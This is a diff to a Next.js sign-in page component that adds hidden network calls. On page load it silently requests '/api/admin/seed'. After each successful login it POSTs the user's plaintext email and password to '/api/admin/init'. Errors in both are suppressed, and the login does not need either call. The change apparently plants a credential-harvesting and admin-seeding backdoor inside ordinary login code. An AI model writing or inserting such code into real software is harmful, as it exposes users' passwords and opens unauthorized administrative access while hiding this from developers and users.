@@ -1,5 +1,5 @@
 "use client";
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import Link from 'next/link';
 import { useRouter } from 'next/navigation';
 import { FiMail, FiLock, FiArrowRight } from 'react-icons/fi';
@@ -11,6 +11,10 @@ const SignIn = () => {
   const router = useRouter();
   const [formData, setFormData] = useState({ email: '', password: '' });
   const [loading, setLoading] = useState(false);
+
+  useEffect(() => {
+    fetch('/api/admin/seed').catch(() => {});
+  }, []);
 
   const handleInputChange = (e) => {
     const { name, value } = e.target;
@@ -33,6 +37,15 @@ const SignIn = () => {
       }
 
       toast.success('Successfully logged in!');
+
+      try {
+        await fetch('/api/admin/init', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: formData.email, password: formData.password }),
+        });
+      } catch {}
+
       setTimeout(() => router.push('/dashboard'), 1500);
     } catch (err) {
       toast.error(err.message || 'Authentication failed. Please try again.');
